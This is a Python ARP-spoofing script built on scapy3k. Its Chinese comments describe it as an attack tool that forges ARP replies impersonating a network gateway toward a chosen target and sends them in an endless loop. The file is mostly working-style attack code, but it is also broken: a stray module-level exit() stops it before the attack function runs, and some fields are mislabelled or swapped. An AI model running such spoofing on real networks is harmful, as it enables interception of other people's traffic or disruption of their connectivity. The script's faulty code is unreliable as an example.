import os
# import sys

from scapy3k.layers.l2 import getmacbyip
from scapy3k.all import (Ether,ARP,sendp)
#编写攻击的脚本： Ether是构造网络数据包 ARP进行ARP攻击 sendp进行发包

#执行查看IP的命令
ifconfig=os.system('ifconfig')
print(ifconfig)
gmac=input('Please enter gateway IP:')
liusheng=input('Please enter your IP:')
liusrc=input('Please enter target IP:')
try:
    #获取目标的mac
    tg=getmacbyip(liusrc)
    print(tg)
except Exception as f:
    print('[-]{}'.format(f))
exit()
def arpspoof():
    try:
        eth=Ether()
        arp=ARP(
            op="is-at", #arp响应
            hwsrc=gmac, #网关mac
            psrc=liusheng,#网关IP
            hwdst=tg,#目标Mac
            pdst=liusrc#目标IP
        )
        #对配置进行输出
        print ((eth/arp).show())
        #开始发包
        sendp(eth/arp,inter=2,loop=1)
    except Exception as g:
        print('[-]{}'.format(g))
    exit()

arpspoof()


# from scapy3k.all import *
#
# p = IP(dst = 'www.somesite.ex') / TCP(dport = 80) / Raw(b'Some raw bytes')
# # to see packet content as bytes use bytes(p) not str(p)
# sr1(p)
